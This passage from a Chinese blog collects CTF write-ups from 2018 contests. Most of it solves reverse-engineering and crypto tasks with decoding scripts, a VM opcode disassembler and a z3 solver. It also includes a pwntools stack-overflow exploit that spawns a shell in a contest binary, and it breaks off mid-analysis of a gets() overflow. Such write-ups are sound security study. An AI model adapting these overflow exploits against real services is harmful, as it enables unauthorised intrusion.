B8000000 mov eax,dword ptr ds:[eax+0xB8]00401591 8945 F4 mov dword ptr ss:[ebp-0xC],eax00401594 8B45 F4 mov eax,dword ptr ss:[ebp-0xC] ; re200_no.0040902000401597 8B15 A8AD4000 mov edx,dword ptr ds:[0x40ADA8] ; re200_no.004016190040159D 83C2 06 add edx,0x6004015A0 39D0 cmp eax,edx ; msvcrt._iob004015A2 75 38 jnz short re200_no.004015DC004015A4 8D45 E0 lea eax,dword ptr ss:[ebp-0x20]004015A7 894424 04 mov dword ptr ss:[esp+0x4],eax004015AB C70424 20904000 mov dword ptr ss:[esp],re200_no.00409020 ; ASCII &quot;%20s&quot;004015B2 E8 D1640000 call &lt;jmp.&amp;msvcrt.scanf&gt;004015B7 A1 98AD4000 mov eax,dword ptr ds:[0x40AD98]004015BC 894424 04 mov dword ptr ss:[esp+0x4],eax004015C0 8D45 E0 lea eax,dword ptr ss:[ebp-0x20]004015C3 890424 mov dword ptr ss:[esp],eax004015C6 E8 7CFFFFFF call re200_no.00401547 在1547处，可以看到是对内存中长度为 8 的一串数据与 2 进行了异或： 12345678910111213141516171819202100401547 55 push ebp00401548 89E5 mov ebp,esp0040154A EB 22 jmp short re200_no.0040156E0040154C 8B45 08 mov eax,dword ptr ss:[ebp+0x8]0040154F 0FB610 movzx edx,byte ptr ds:[eax]00401552 8B45 0C mov eax,dword ptr ss:[ebp+0xC]00401555 0FB600 movzx eax,byte ptr ds:[eax]00401558 83F0 02 xor eax,0x20040155B 38C2 cmp dl,al0040155D 74 07 je short re200_no.004015660040155F B8 01000000 mov eax,0x100401564 EB 17 jmp short re200_no.0040157D00401566 8345 08 01 add dword ptr ss:[ebp+0x8],0x10040156A 8345 0C 01 add dword ptr ss:[ebp+0xC],0x10040156E 8B45 0C mov eax,dword ptr ss:[ebp+0xC]00401571 0FB600 movzx eax,byte ptr ds:[eax]00401574 3C 02 cmp al,0x200401576 ^ 75 D4 jnz short re200_no.0040154C00401578 B8 00000000 mov eax,0x00040157D 5D pop ebp ; re200_no.004015CB0040157E C3 retn 在堆栈部分可以看到存储的地址： 123456780028F62C /0028F66C0028F630 |004015CB 返回到 re200_no.004015CB 来自 re200_no.004015470028F634 |0028F64C 输入字符串地址0028F638 |0028FDCC 用来比较的字符串的地址0028F63C |000000000028F640 |000000000028F644 |000000000028F648 |00000000 在数据窗口跟随得到数据： 120028FDCC 75 31 6E 6E 66 32 6C 67 02 50 6C 65 61 73 65 20 u1nnf2lg\u0002Please0028FDDC 65 6E 74 65 72 20 74 68 65 20 73 65 63 6F 6E 64 enter the second 写个脚本逆出结果： 1234567#!/usr/bin/env pythonenc = [0x75, 0x31, 0x6E, 0x6E, 0x66, 0x32, 0x6C, 0x67, 0x02]res = ''for i in range(len(enc)): res += chr(enc[i] ^ 0x02)print res# w3lld0ne 逆向 300DescriptionELF(逆向 300, 已解决 139) 题目描述: 靠,我这儿也没有 IDA 啊相关附件: rev300.zip Solution12$ file rev300rev300: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=a93ffe39302e19ef5184a1d86b720b11a7a97941, stripped 总共有两个 check： 12345678910111213int __cdecl main(int a1, char **a2)&#123; if ( a1 &gt; 1 &amp;&amp; sub_8048414(a2[1], 0) ) &#123; puts(\"Access granted\"); sub_8048538((int)a2[1]); &#125; else &#123; puts(\"Access denied\"); &#125; return 0;&#125; 第一个是对程序参数的的一个比较，一个递归的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354signed int __cdecl sub_8048414(_BYTE *a1, int a2)&#123; signed int result; // eax switch ( a2 ) &#123; case 0: if ( *a1 == 'i' ) goto LABEL_19; result = 0; break; case 1: if ( *a1 == 'e' ) goto LABEL_19; result = 0; break; case 3: if ( *a1 == 'n' ) goto LABEL_19; result = 0; break; case 4: if ( *a1 == 'd' ) goto LABEL_19; result = 0; break; case 5: if ( *a1 == 'a' ) goto LABEL_19; result = 0; break; case 6: if ( *a1 == 'g' ) goto LABEL_19; result = 0; break; case 7: if ( *a1 == 's' ) goto LABEL_19; result = 0; break; case 9: if ( *a1 == 'r' )LABEL_19: result = sub_8048414(a1 + 1, 7 * (a2 + 1) % 11); else result = 0; break; default: result = 1; break; &#125; return result;&#125; 第二个是把正确的输入和内存中的数据进行异或： 12345678910int __cdecl sub_8048538(int a1)&#123; int v2[33]; // [esp+18h] [ebp-A0h] int i; // [esp+9Ch] [ebp-1Ch] qmemcpy(v2, &amp;unk_8048760, sizeof(v2)); for ( i = 0; i &lt;= 32; ++i ) putchar(v2[i] ^ *(char *)(a1 + i % 8)); return putchar(10);&#125; 脚本如下： 123456789101112131415161718192021222324252627#!/usr/bin/env pythonenc = [0x0000000F, 0x0000001F, 0x00000004, 0x00000009, 0x0000001C, 0x00000012, 0x00000042, 0x00000009, 0x0000000C, 0x00000044, 0x0000000D, 0x00000007, 0x00000009, 0x00000006, 0x0000002D, 0x00000037, 0x00000059, 0x0000001E, 0x00000000, 0x00000059, 0x0000000F, 0x00000008, 0x0000001C, 0x00000023, 0x00000036, 0x00000007, 0x00000055, 0x00000002, 0x0000000C, 0x00000008, 0x00000041, 0x0000000A, 0x00000014]key = ''i = 0for j in range(8): if i == 0: key += 'i' if i == 1: key += 'e' if i == 3: key += 'n' if i == 4: key += 'd' if i == 5: key += 'a' if i == 6: key += 'g' if i == 7: key += 's' if i == 9: key += 'r' i = 7 * (i + 1) % 11print keyflag = ''for i in range(len(enc)): flag += chr(enc[i] ^ ord(key[i % 8]))print flag 对参数的求解也可以用 angr 来完成： 123456789#!/usr/bin/env pythonimport angrimport claripyp = angr.Project('./rev300')flag = claripy.BVS('flag', 50 * 8)state = p.factory.entry_state(args=['./rev300', flag])sim = p.factory.simgr(state)sim.explore(find=0x080485E0, avoid=0x080485FE)print(sim.found[0].solver.eval(flag, cast_to=bytes)) Referenceshttps://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=530793https://blog.csdn.net/xiangshangbashaonian/article/details/82953042https://docs.microsoft.com/en-us/windows/win32/debug/using-a-vectored-exception-handler","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"},{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"}]},{"title":"2018-护网杯","slug":"2018-护网杯","date":"2018-10-16T10:18:29.000Z","updated":"2019-08-26T01:14:42.849Z","comments":true,"path":"2018/10/16/2018-护网杯/","link":"","permalink":"qianfei11.coding.me/2018/10/16/2018-护网杯/","excerpt":"看着大佬们的 wp 复现一波。","text":"看着大佬们的 wp 复现一波。 迟到的签到题充分证明了自己是个签到题选手。 12345678910import base64enc = ''enc = base64.b64decode(enc)# test = 'flag&#123;'# for i in range(len(test)):# print chr(ord(test) ^ ord(enc)),flag = ''for i in range(len(enc)): flag += chr(ord(enc[i]) ^ ord('f'))print flag FEZ给出了一个 py 实现的加密算法，和一个被加密后输出的 log。了解一下之后，大概是菲斯特尔(Feistel)密码，也就是 DES。 分析一下，可以发现比较难的点是中间的多次繁琐的异或，逆向实现较难。通过正向分析加密的过程来观察。 12345678910111213// l即左半部分，r即右半部分 l + r1. r + r^l^k12. r^l^k1 + r^l^k1^r^k2 =&gt; r^l^k1 + l^k1^k23. l^k1^k2 + l^k1^k2^r^l^k1^k3 =&gt; l^k1^k2 + r^k2^k34. r^k2^k3 + r^k2^k3^l^k1^k2^k4 =&gt; r^k2^k3 + r^l^k1^k3^k45. r^l^k1^k3^k4 + r^l^k1^k3^k4^r^k2^k3^k5 =&gt; r^l^k1^k3^k4 + l^k1^k2^k4^k56. l^k1^k2^k4^k5 + l^k1^k2^k4^k5^r^l^k1^k3^k4^k6 =&gt; l^k1^k2^k4^k5 + r^k2^k3^k5^k67. r^k2^k3^k5^k6 + r^k2^k3^k5^k6^l^k1^k2^k4^k5^k7 =&gt; r^k2^k3^k5^k6 + r^l^k1^k3^k4^k6^k7// 对于m和test来说是一样的enc1 = xor(test, k) = t_r^k2^k3^k5^k6 + t_r^t_l^k1^k3^k4^k6^k7enc2 = xor(m, k) = m_r^k2^k3^k5^k6 + m_r^m_l^k1^k3^k4^k6^k7 由于 test 的值是已知的，可以先利用 test 的左右两部分求出 k2356 和 k13467。然后再利用这两个数求出 m 的左右两部分，m 中就含有 flag。脚本如下： 12345678910111213141516171819202122def xor(a,b): assert len(a)==len(b) c=\"\" for i in range(len(a)): c+=chr(ord(a[i])^ord(b[i])) return ctest = '8664f7f564f097907c082328ebcdc95e8dc37eec3827fd9c93cc84ebb517c5e396c19d12e730ee3f3fb9e84110f9c92b29ddeab60797'enc1 = '4b4ce14cdb9ace2c678b9a64892cc9d5f2a61e7e2dc256877f2fb454c4d37760278640ab1737c62ba4a403acb14a893facfc1819b259'enc2 = 'd4c898ee5f6b68d6120bd7fb11f5cf4d0431324c40e0b3a6ae9fbd1f17295be643c45ec7f306063dd1009ae5d62b0803c7909629aba7't_l = test.decode('hex')[:27]t_r = test.decode('hex')[27:]k2356 = xor(enc1.decode('hex')[:27], t_r)k13467 = xor(xor(enc1.decode('hex')[27:], t_r), t_l)m_r = xor(enc2.decode('hex')[:27], k2356)m_l = xor(xor(enc2.decode('hex')[27:], m_r), k13467)flag = m_l + m_rprint flag GETTINGSTART拿到题目跑了一下，然后 checksec 看看开了什么保护： 1234567qianfei@qianfeideMacBook-Air ~/ti/2018 huwangbei/GETTINGSTART checksec task_gettingStart_ktQeERc[*] &apos;/Users/qianfei/ti/2018 huwangbei/GETTINGSTART/task_gettingStart_ktQeERc&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 拖进 ida 里看一看，就是很明显的栈溢出： 12345678910111213141516171819202122232425262728293031__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; __int64 buf; // [rsp+10h] [rbp-30h] __int64 v5; // [rsp+18h] [rbp-28h] __int64 v6; // [rsp+20h] [rbp-20h] __int64 v7; // [rsp+28h] [rbp-18h] double v8; // [rsp+30h] [rbp-10h] unsigned __int64 v9; // [rsp+38h] [rbp-8h] v9 = __readfsqword(0x28u); buf = 0LL; v5 = 0LL; v6 = 0LL; v7 = 0x7FFFFFFFFFFFFFFFLL; v8 = 1.797693134862316e308; setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); printf(\"HuWangBei CTF 2018 will be getting start after %lu seconds...\\n\", 0LL, 1.797693134862316e308); puts(\"But Whether it starts depends on you.\"); read(0, &amp;buf, 0x28uLL); if ( v7 != 0x7FFFFFFFFFFFFFFFLL || v8 != 0.1 ) &#123; puts(\"Try again!\"); &#125; else &#123; printf(\"HuWangBei CTF 2018 will be getting start after %g seconds...\\n\", &amp;buf, v8); system(\"/bin/sh\"); &#125; return 0LL;&#125; buf和v7还有v8之间的相对位置也比较清楚，主要就是解决 double 的0.1在内存中存储是什么样子的。通过写一个小的 c 程序得到结果： 12345678#include &lt;stdio.h&gt;int main() &#123; double x = 0.1; long long n = *(long long*)&amp;x; printf(\"%llX\", n); return 0;&#125; 输出结果为0x3FB999999999999A，也就是-1的值。exp 如下： 12345678from pwn import *p = process('./task1')v7 = 0x7FFFFFFFFFFFFFFFv8 = 0x3FB999999999999Aoffset = 0x28payload = (p64(v7) + p64(v8)).rjust(offset, '\\0')p.sendline(payload)p.interactive() RERERE此处记录lilac 的 writeup 通过搜索字符串找到程序校验位置，分析虚表中的函数，发现这又是一个虚拟机，因此只需要按照套路将每一个虚拟机的指令分析清楚，最终分析得到的虚表是这样的： 123456789101112131415161718192021222324252627282930.rdata:004031CC ; const RE::`vftable&apos;.rdata:004031CC ??_7RE@@6B@ dd offset assign_hi ; DATA XREF: sub_4016A0+46↑o.rdata:004031D0 dd offset get_par_hi.rdata:004031D4 dd offset inc_ip.rdata:004031D8 dd offset get_par_lo.rdata:004031DC dd offset dec_assign_hi.rdata:004031E0 dd offset add_to_hi.rdata:004031E4 dd offset subs_to_hi.rdata:004031E8 dd offset inc_assign_hi.rdata:004031EC dd offset xor_to_hi.rdata:004031F0 dd offset and_to_hi.rdata:004031F4 dd offset mul_to_hi.rdata:004031F8 dd offset mod_to_hi.rdata:004031FC dd offset push_hi.rdata:00403200 dd offset assign_lo_to_hi.rdata:00403204 dd offset load_to_hi.rdata:00403208 dd offset push.rdata:0040320C dd offset pop.rdata:00403210 dd offset store.rdata:00403214 dd offset j_flag_neg1.rdata:00403218 dd offset j_flag_1.rdata:0040321C dd offset j_not_flag.rdata:00403220 dd offset jmp_bck_cnt.rdata:00403224 dd offset cmp_hi_to_lo.rdata:00403228 dd offset inc_mem_ptr.rdata:0040322C dd offset dec_mem_ptr.rdata:00403230 dd offset xor_block.rdata:00403234 dd offset init_regs.rdata:00403238 dd offset get_res.rdata:0040323C dd offset execute_vm 其中名字中hi表示目标寄存器编号，lo表示源寄存器编号，execute_vm是执行虚拟机代码的函数，执行程序中硬编码的一段虚拟机指令。在 ida 中新建一个结构，将各个偏移的名字填上虚表函数名，就可以在execute_vm中看到opcode所对应的具体函数是什么了。通过分析这些函数的操作也很容易确定虚拟机的结构： 123456789101100000000 Vm00000000 vtable dd ?00000004 reg0 dd ?00000008 reg1 dd ?0000000C reg2 dd ?00000010 cnt dd ?00000014 flag dd ?00000018 maybe_mem dd ?0000001C field_1C dd ?00000020 stack dd ?00000024 ip_ptr dd ? 于是可以写 python 脚本将 opcode 还原成易读的伪汇编语言的形式： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253code = [79, 0, 0, 0, 47, 85, 5, 84, 48, 70, 0, 71, 34, 72, 2, 75, 51, 73, 79, 0, 0, 0, 70, 84, 16, 72, 1, 77, 39, 79, 0, 0, 0, 48, 84, 16, 72, 1, 68, 22, 79, 0, 0, 0, 57, 84, 16, 72, 1, 68, 11, 79, 0, 0, 0, 65, 84, 1, 72, 1, 68, 6, 71, 0, 72, 0, 75, 5, 71, 0, 80, 0, 67, 85, 64, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 51, 180, 136, 172, 84, 32, 72, 18, 71, 0, 75, 3, 80, 0, 67, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 74, 11, 148, 63, 84, 32, 72, 18, 71, 0, 75, 3, 80, 0, 67, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 124, 92, 220, 236, 84, 32, 72, 18, 71, 0, 75, 3, 80, 0, 67, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 57, 41, 117, 27, 84, 32, 72, 18, 71, 0, 75, 3, 80, 0, 67, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 30, 242, 107, 45, 84, 32, 72, 18, 71, 0, 75, 3, 80, 0, 67, 79, 0, 0, 0, 7, 84, 48, 71, 17, 86, 70, 0, 79, 0, 0, 0, 48, 84, 32, 89, 2, 79, 0, 0, 0, 10, 84, 32, 72, 2, 68, 9, 79, 0, 0, 0, 7, 84, 32, 89, 2, 79, 0, 0, 0, 16, 84, 32, 88, 18, 83, 16, 85, 43, 79, 131, 141, 181, 46, 84, 32, 72, 18, 71, 0, 75, 2, 80, 0, 67]opcodes = &#123; 67: (\"return result\", 1), 68: (\"j_flag_neg1\", 2), 69: (\"mod_to_hi\", 2), 70: (\"load_to_hi\", 2), 71: (\"xor_to_hi\", 2), 72: (\"cmp_hi_to_lo\", 2), 73: (\"inc_mem_ptr\", 1), 74: (\"and_to_hi\", 2), 75: (\"j_not_flag\", 2), 76: (\"xor_block\", 16), 77: (\"j_flag_1\", 2), 78: (\"dec_assign_hi\", 2), 79: (\"push\", 5), 80: (\"inc_assign_hi\", 2), 81: (\"assign_lo_to_hi\", 2), 82: (\"push hi\", 2), 83: (\"add_to_hi\", 2), 84: (\"pop hi\", 2), 85: (\"jmp_bck_cnt\", 2), 86: (\"dec_mem_ptr\", 1), 87: (\"store hi\", 2), 88: (\"mul_to_hi\", 2), 89: (\"subs_to_hi\", 2)&#125;pc = 0while pc != len(code): opcode = code[pc] name = opcodes[opcode][0] length = opcodes[opcode][1] print \"%03x\\t\" % pc, print name, if length == 1: print pc += 1 elif length == 2: if 'hi' in name: print code[pc+1] &gt;&gt; 4, code[pc+1] &amp; 0xf else: print hex(code[pc+1]) pc += 2 elif length == 5: num = (code[pc+1] &lt;&lt; 24) | (code[pc+2] &lt;&lt; 16) | (code[pc+3] &lt;&lt; 8) | (code[pc+4] &lt;&lt; 0) print hex(num) pc += 5 elif length == 16: print for i in range(15): code[i + pc + 1] ^= 0x66 pc += 16 运行得到如下输出（输出中注释是分析过程）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200000 push 0x2f005 jmp_bck_cnt 0x5007 pop hi 3 0009 load_to_hi 0 000b xor_to_hi 2 200d cmp_hi_to_lo 0 200f j_not_flag 0x33 =&gt; 0x44011 inc_mem_ptr012 push 0x46017 pop hi 1 0019 cmp_hi_to_lo 0 101b j_flag_1 0x27 =&gt; 0x4401d push 0x30022 pop hi 1 0024 cmp_hi_to_lo 0 1026 j_flag_neg1 0x16 =&gt; 0x3e028 push 0x3902d pop hi 1 002f cmp_hi_to_lo 0 1031 j_flag_neg1 0xb =&gt; 0x3e033 push 0x41038 pop hi 0 103a cmp_hi_to_lo 0 103c j_flag_neg1 0x6 =&gt; 0x4403e xor_to_hi 0 0040 cmp_hi_to_lo 0 0042 j_not_flag 0x5 =&gt; 0x49fail:044 xor_to_hi 0 0046 inc_assign_hi 0 0048 return result049 jmp_bck_cnt 0x40(check hex digits)04b push 0x7050 pop hi 3 0 // cnt = 0x7052 xor_to_hi 1 1 // reg[1] = 0back:054 dec_mem_ptr055 load_to_hi 0 0 // reg[0] = c057 push 0x3005c pop hi 2 0 // reg[2] = 0x3005e subs_to_hi 0 2 // c-=0x30060 push 0xa065 pop hi 2 0 // reg[2] = 10067 cmp_hi_to_lo 0 2069 j_flag_neg1 0x9 // c &lt; 10 =&gt; less_than_1006b push 0x7070 pop hi 2 0 // reg[2] = 7072 subs_to_hi 0 2 // c-=7less_than_10:074 push 0x10079 pop hi 2 007b mul_to_hi 1 2 i &lt;&lt; 407d add_to_hi 1 0 i += c07f jmp_bck_cnt 0x2b =&gt; back081 push 0x33b488ac086 pop hi 2 0088 cmp_hi_to_lo 1 208a xor_to_hi 0 008c j_not_flag 0x308e inc_assign_hi 0 0090 return result(后七个字符为 &quot;33b488ac&quot;[::-1])091 push 0x7096 pop hi 3 0098 xor_to_hi 1 109a dec_mem_ptr09b load_to_hi 0 009d push 0x300a2 pop hi 2 00a4 subs_to_hi 0 20a6 push 0xa0ab pop hi 2 00ad cmp_hi_to_lo 0 20af j_flag_neg1 0x90b1 push 0x70b6 pop hi 2 00b8 subs_to_hi 0 20ba push 0x100bf pop hi 2 00c1 mul_to_hi 1 20c3 add_to_hi 1 00c5 jmp_bck_cnt 0x2b0c7 push 0x4a0b943f0cc pop hi 2 00ce cmp_hi_to_lo 1 20d0 xor_to_hi 0 00d2 j_not_flag 0x30d4 inc_assign_hi 0 00d6 return result0d7 push 0x70dc pop hi 3 00de xor_to_hi 1 10e0 dec_mem_ptr0e1 load_to_hi 0 00e3 push 0x300e8 pop hi 2 00ea subs_to_hi 0 20ec push 0xa0f1 pop hi 2 00f3 cmp_hi_to_lo 0 20f5 j_flag_neg1 0x90f7 push 0x70fc pop hi 2 00fe subs_to_hi 0 2100 push 0x10105 pop hi 2 0107 mul_to_hi 1 2109 add_to_hi 1 010b jmp_bck_cnt 0x2b10d push 0x7c5cdcec112 pop hi 2 0114 cmp_hi_to_lo 1 2116 xor_to_hi 0 0118 j_not_flag 0x311a inc_assign_hi 0 011c return result11d push 0x7122 pop hi 3 0124 xor_to_hi 1 1126 dec_mem_ptr127 load_to_hi 0 0129 push 0x3012e pop hi 2 0130 subs_to_hi 0 2132 push 0xa137 pop hi 2 0139 cmp_hi_to_lo 0 213b j_flag_neg1 0x913d push 0x7142 pop hi 2 0144 subs_to_hi 0 2146 push 0x1014b pop hi 2 014d mul_to_hi 1 214f add_to_hi 1 0151 jmp_bck_cnt 0x2b153 push 0x3929751b158 pop hi 2 015a cmp_hi_to_lo 1 215c xor_to_hi 0 015e j_not_flag 0x3160 inc_assign_hi 0 0162 return result163 push 0x7168 pop hi 3 016a xor_to_hi 1 116c dec_mem_ptr16d load_to_hi 0 016f push 0x30174 pop hi 2 0176 subs_to_hi 0 2178 push 0xa17d pop hi 2 017f cmp_hi_to_lo 0 2181 j_flag_neg1 0x9183 push 0x7188 pop hi 2 018a subs_to_hi 0 218c push 0x10191 pop hi 2 0193 mul_to_hi 1 2195 add_to_hi 1 0197 jmp_bck_cnt 0x2b199 push 0x1ef26b2d19e pop hi 2 01a0 cmp_hi_to_lo 1 21a2 xor_to_hi 0 01a4 j_not_flag 0x31a6 inc_assign_hi 0 01a8 return result1a9 push 0x71ae pop hi 3 01b0 xor_to_hi 1 11b2 dec_mem_ptr1b3 load_to_hi 0 01b5 push 0x301ba pop hi 2 01bc subs_to_hi 0 21be push 0xa1c3 pop hi 2 01c5 cmp_hi_to_lo 0 21c7 j_flag_neg1 0x91c9 push 0x71ce pop hi 2 01d0 subs_to_hi 0 21d2 push 0x101d7 pop hi 2 01d9 mul_to_hi 1 21db add_to_hi 1 01dd jmp_bck_cnt 0x2b1df push 0x838db52e1e4 pop hi 2 01e6 cmp_hi_to_lo 1 21e8 xor_to_hi 0 01ea j_not_flag 0x21ec inc_assign_hi 0 01ee return result 分析到 090 观察到下面都是类似的代码结构，之后直接还原 flag 就可以了，只需要把比较的十六进制字符串按端序从后往前拼接起来得到 flag。 参考网站https://laucyun.com/3411bc6f400207178b85defa04474b4a.htmlhttps://spaces.ac.cn/archives/1907https://math.stackexchange.com/questions/1791562/converting-0-1-to-binary-64-bit-doublehttps://xz.aliyun.com/t/2897https://blog.csdn.net/qq_33438733/article/details/83044151","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"}]},{"title":"2018-网鼎杯","slug":"2018-网鼎杯","date":"2018-09-12T13:00:45.000Z","updated":"2019-11-24T10:37:51.870Z","comments":true,"path":"2018/09/12/2018-网鼎杯/","link":"","permalink":"qianfei11.coding.me/2018/09/12/2018-网鼎杯/","excerpt":"现阶段主要一直在做逆向，看了好几道逆向的 wp 复现一下。","text":"现阶段主要一直在做逆向，看了好几道逆向的 wp 复现一下。 REbeijing简单的异或，直接取原来的数据： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;stdio.h&gt;unsigned char pair[28] = &#123; 0x61, 0x4C, 0x67, 0x59, 0x69, 0x29, 0x6E, 0x42, 0x62, 0x0D, 0x65, 0x71, 0x66, 0x34, 0x6A, 0xC6, 0x6D, 0x8A, 0x6C, 0x7F, 0x7B, 0xAE, 0x7A, 0x92, 0x7D, 0xEC, 0x5F, 0x57&#125;;unsigned int choice[22] = &#123; 0x6, 0x9, 0x0, 0x1, 0xA, 0x0, 0x8, 0x0, 0xB, 0x2, 0x3, 0x1, 0xD, 0x4, 0x5, 0x2, 0x7, 0x2, 0x3, 0x1, 0xC&#125;;int main() &#123; char tmp = 0; for(int i = 0; i &lt; 22; i++) &#123; switch(choice[i]) &#123; case 0: tmp = pair[2 * choice[i]]; break; case 1: tmp = pair[2 * choice[i]]; break; case 2: tmp = pair[2 * choice[i]]; break; case 3: tmp = pair[2 * choice[i]]; break; case 4: tmp = pair[2 * choice[i]]; break; case 5: tmp = pair[2 * choice[i]]; break; case 6: tmp = pair[2 * choice[i]]; break; case 7: tmp = pair[2 * choice[i]]; break; case 8: tmp = pair[2 * choice[i]]; break; case 9: tmp = pair[2 * choice[i]]; break; case 10: tmp = pair[2 * choice[i]]; break; case 11: tmp = pair[2 * choice[i]]; break; case 12: tmp = pair[2 * choice[i]]; break; case 13: tmp = pair[2 * choice[i]]; break; default: tmp = 0; break; &#125; printf(\"%c\", tmp); fflush(stdout); &#125; return 0;&#125; advanced非预期解，对加密了的字符串尝试异或就找到了规律： 12345678enc = 'K@LKVHr[DXEsLsYI@\\\\AMYIr\\\\EIZQ'flag = ''for i in range(len(enc)): if i &amp; 1: flag += chr(ord(enc[i]) ^ 0x2C) else: flag += chr(ord(enc[i]) ^ 0x2D)print flag blend和之前的一道题基本一样。 通过 gdb 远程连接 qemu 进行动态调试，或者在 ida 中静态分析。程序逻辑先是判断字符串长度是否大于 19： 然后在循环中逐个比较： 在循环中，主要是pshufd指令的操作： 123456780xffffffffffffff00 0xffffffffffffff000xffffffffffff00ff 0xffffffffffff00ff0xffffffffff00ffff 0xffffffffff00ffff0xffffffff00ffffff 0xffffffff00ffffff0xffffff00ffffffff 0xffffff00ffffffff0xffff00ffffffffff 0xffff00ffffffffff0xff00ffffffffffff 0xff00ffffffffffff0x00ffffffffffffff 0x00ffffffffffffff 然后与内存中的数据相与，再通过psadbw指令进行绝对差求和。还有对高低位的一个位置交换： 123seg000:009F mov di, ds:1268hseg000:00A3 shl edi, 10hseg000:00A7 mov di, ds:1270h 最后用 z3 约束求解： 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env pythonfrom z3 import *def z3_abs(x): return If(x &gt;= 0, x, -x)def psadbw(xmm0, xmm1): a = Sum([z3_abs(b1 - b2) for b1, b2 in zip(xmm0[:8], xmm1[:8])]) b = Sum([z3_abs(b1 - b2) for b1, b2 in zip(xmm0[8:], xmm1[8:])]) return a + b * 0x10000s = Solver()ZERO = IntVal(0)xmm5 = '220f02c883fbe083c0200f10cd0013b8'.decode('hex')xmm5 = [ord(c) for c in xmm5]xmm5s = [xmm5]xmm0 = [Int('x%d' % i) for i in range(16)]for c in xmm0: s.add(c &gt;= 32, c &lt;= 126)check = [0x03110304, 0x02d902cd, 0x02d402db, 0x02c402e2, 0x02ce02e2, 0x02d802ed, 0x02dc02e8, 0x02dd02f6]xmm5s += map(lambda e: [0, 0, 0, 0, 0, 0, (e &gt;&gt; 8) &amp; 0xFF, e &amp; 0xFF, 0, 0, 0, 0, 0, 0, e &gt;&gt; 24, (e &gt;&gt; 16) &amp; 0xFF], check)print xmm5sfor i in range(8): xmm5 = xmm5s[i] xmm2 = list(xmm0) xmm2[7 - i] = ZERO xmm2[15 - i] = ZERO res = psadbw(xmm5, xmm2) s.add(res == check[i])if s.check() == sat: print s.model() flag = ''.join(chr(eval(str(s.model()[c]))) for c in xmm0) # pshufd xmm0, xmm0, 1Eh flag = 'flag' + flag[:4][::-1] + flag[4:8][::-1] + flag[12:][::-1] + flag[8:12][::-1] print flag # flagmbr_is_funny__eh PWNGUESS漏洞点很明显，gets处可以溢出： 123456789101112131415161718192021222324252627282930313233343536373839404142434445__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; __WAIT_STATUS stat_loc; // [rsp+14h] [rbp-8Ch] int v5; // [rsp+1Ch] [rbp-84h] __int64 v6; // [rsp+20h] [rbp-80h] __int64 v7; // [rsp+28h] [rbp-78h] char buf; // [rsp+30h] [rbp-70h] char s2; // [rsp+60h] [rbp-40h] unsigned __int64 v10; // [rsp+98h] [rbp-8h] v10 = __readfsqword(0x28u); v7 = 3LL; LODWORD(stat_loc.__uptr) = 0; v6 = 0LL; sub_4009A6(); HIDWORD(stat_loc.__iptr) = open(\"./flag.txt\", 0, a2); if ( HIDWORD(stat_loc.__iptr) == -1 ) &#123; perror(\"./flag.txt\"); _exit(-1); &#125; read(SHIDWORD(stat_loc.__iptr), &amp;buf, 0x30uLL); close(SHIDWORD(stat_loc.__iptr)); puts(\"This is GUESS FLAG CHALLENGE!\"); while ( 1 ) &#123; if ( v6 &gt;= v7 ) &#123; puts(\"you have no sense... bye :-) \"); return 0LL; &#125; v5 = sub_400A11(); // fork() if ( !v5 ) break; ++v6; wait((__WAIT_STATUS)&amp;stat_loc); &#125; puts(\"Please type your guessing flag\"); gets((__int64)&amp;s2); if ( !strcmp(&amp;buf, &amp;s2) ) puts(\"You must have great six 